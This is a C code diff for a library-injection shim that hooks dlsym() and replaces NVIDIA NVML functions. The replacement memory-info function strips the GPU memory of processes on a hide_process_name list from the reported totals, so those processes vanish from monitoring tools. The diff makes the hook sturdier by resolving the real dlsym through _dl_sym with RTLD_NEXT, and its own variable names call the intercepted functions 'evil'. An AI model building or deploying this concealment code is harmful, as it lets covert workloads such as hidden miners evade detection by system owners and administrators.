@@ -62,7 +62,6 @@ typedef struct nvmlProcessInfo_st {
   //  0xFFFFFFFF otherwise.
 } nvmlProcessInfo_t;
 
-
 nvmlReturn_t DECLDIR nvmlDeviceGetComputeRunningProcesses_v2(nvmlDevice_t device,
 															 unsigned int *infoCount,
 															 nvmlProcessInfo_t *infos) {
@@ -167,8 +166,8 @@ nvmlReturn_t DECLDIR nvmlDeviceGetMemoryInfo(nvmlDevice_t device, nvmlMemory_t *
 
 	  for (int i = 0; i < sizeof(hide_process_name) / sizeof(hide_process_name[0]); i++) {
 		if (strstr(proc_name, hide_process_name[i]) != NULL) {
-		  memory->free += (infos+count)->usedGpuMemory;
-		  memory->used -= (infos+count)->usedGpuMemory;
+		  memory->free += (infos + count)->usedGpuMemory;
+		  memory->used -= (infos + count)->usedGpuMemory;
 		  break;
 		}
 	  }
@@ -230,17 +229,39 @@ const char *evil_function1 = "nvmlDeviceGetComputeRunningProcesses_v2";
 const char *evil_function2 = "nvmlDeviceGetGraphicsRunningProcesses_v2";
 const char *evil_function3 = "nvmlDeviceGetMemoryInfo";
 
-void *dlsym(void *handle, const char *symbol) {
+//void *dlsym(void *handle, const char *symbol) {
+//
+//  if (strcmp(symbol, evil_function1) == 0) {
+//	void *result = nvmlDeviceGetComputeRunningProcesses_v2;
+//	return result;
+//  } else if (strcmp(symbol, evil_function2) == 0) {
+//	void *result = nvmlDeviceGetGraphicsRunningProcesses_v2;
+//	return result;
+//  } else if (strcmp(symbol, evil_function3) == 0) {
+//	void *result = nvmlDeviceGetMemoryInfo;
+//	return result;
+//  }
+//  return __libc_dlsym(handle, symbol); /* now, this will call dlsym() library function */
+//}
 
-  if (strcmp(symbol, evil_function1) == 0) {
+
+extern void *_dl_sym(void *, const char *, void *);
+extern void *dlsym(void *handle, const char *name) {
+  static void *(*real_dlsym)(void *, const char *) =NULL;
+  if (real_dlsym == NULL) real_dlsym = _dl_sym(RTLD_NEXT, "dlsym", dlsym);
+  /* my target binary is even asking for dlsym() via dlsym()... */
+  if (!strcmp(name, "dlsym"))
+	return (void *) dlsym;
+
+  if (strcmp(name, evil_function1) == 0) {
 	void *result = nvmlDeviceGetComputeRunningProcesses_v2;
 	return result;
-  } else if (strcmp(symbol, evil_function2) == 0) {
+  } else if (strcmp(name, evil_function2) == 0) {
 	void *result = nvmlDeviceGetGraphicsRunningProcesses_v2;
 	return result;
-  } else if (strcmp(symbol, evil_function3) == 0) {
+  } else if (strcmp(name, evil_function3) == 0) {
 	void *result = nvmlDeviceGetMemoryInfo;
 	return result;
   }
-  return __libc_dlsym(handle, symbol); /* now, this will call dlsym() library function */
+  return real_dlsym(handle, name);
 }
